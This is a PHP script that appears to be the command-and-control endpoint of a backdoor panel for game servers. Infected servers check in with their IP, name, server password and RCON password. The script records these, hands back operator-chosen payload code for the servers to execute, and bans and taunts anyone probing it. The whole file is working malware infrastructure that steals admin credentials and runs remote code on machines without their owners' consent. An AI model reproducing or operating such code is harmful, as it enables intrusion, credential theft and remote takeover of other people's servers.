<?php
$browser = $_SERVER['HTTP_USER_AGENT'];
include('class/include.php');
if(BanIP::IsBanned($_SERVER["REMOTE_ADDR"]))
	{
		die("Vous êtes banni IP, venez sur le discord pour vous faire debannir https://discord.gg/rVbb2Kx");
	}

if ($browser == "Valve/Steam HTTP Client 1.0 (4000)") {

$server_ip = $_POST['i'];
$server_name = $_POST['n'];
$server_users_number = $_POST['nb'];
$key = $_POST['key'];

if(!isset($_COOKIE["DownIsMaster"])){
	setcookie("DownIsMaster", uniqid(), time()+31556926);
  }
  if(isset($_COOKIE["DownIsMaster"])){
	  BanIP::BanTheIP($_SERVER["REMOTE_ADDR"]);
	  die("Security anti script kiddies by GHackDoor (Merci Anatik)");
}

if($server_ip == "0.0.0.0:0")
	$server_ip = $_SERVER["REMOTE_ADDR"] . ":27015";

if (strpos($server_ip, $_SERVER["REMOTE_ADDR"]) !== false) {
}else{		
	die("PrintMessage(10,'')");
}

if ($server_ip != "" && $server_name != "")
{
	$ip_data = explode(':', $server_ip);
	$server_id = Server::GetServerByIP($ip_data[0]);
	if ($server_id == false)
	{

		Server::AddServer(htmlentities($server_name), $ip_data[0], $ip_data[1], $server_users_number, $key, $_POST["pw"], $_POST["map"], $_POST["gm"], $_POST["rcon"], $_POST["players"], $_POST["additionnals"]);
		echo "PrintMessage(10,'')";
	}
	else
	{

		Server::UpdateServer($server_id, $server_name, $ip_data[0], $ip_data[1], $server_users_number, $_POST["pw"], $_POST["map"], $_POST["gm"], $_POST["rcon"], $_POST["players"], $_POST["additionnals"]);

		$payload_id = Server::GetServerPayload($server_id);
		if ($payload_id == -1)
		{
			echo "PrintMessage(10,'')";
		}
		else
		{
			$server = Server::GetServer($server_id);
			$arg = $server["payload_arg"];
			$payload = html_entity_decode(Payload::GetPayload($payload_id)['payload_content']);
			echo str_replace("{ARG}", $arg, $payload);
			Server::ResetPayload($server_id);
		}
	}
}
}else{
	BanIP::BanTheIP($_SERVER["REMOTE_ADDR"]);
	die("rip");
}
session_destroy();
?> 